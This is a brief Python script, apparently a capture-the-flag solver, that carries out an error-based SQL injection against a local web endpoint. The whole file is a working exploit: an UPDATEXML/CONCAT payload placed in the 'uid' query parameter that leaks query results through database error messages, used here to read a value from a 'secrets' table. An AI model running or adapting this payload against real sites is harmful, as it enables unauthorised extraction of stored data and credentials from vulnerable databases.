#!/usr/bin/env python3
import requests, re
TARGET = "http://localhost:5010/profile"
def extract(q):
    r = requests.get(TARGET, params={"uid": f"1' AND UPDATEXML(1,CONCAT(0x7e,({q}),0x7e),1)-- "})
    m = re.search(r"~([^~]+)~", r.text)
    return m.group(1) if m else None
print(f"[+] Flag: {extract('SELECT value FROM secrets LIMIT 1')}")
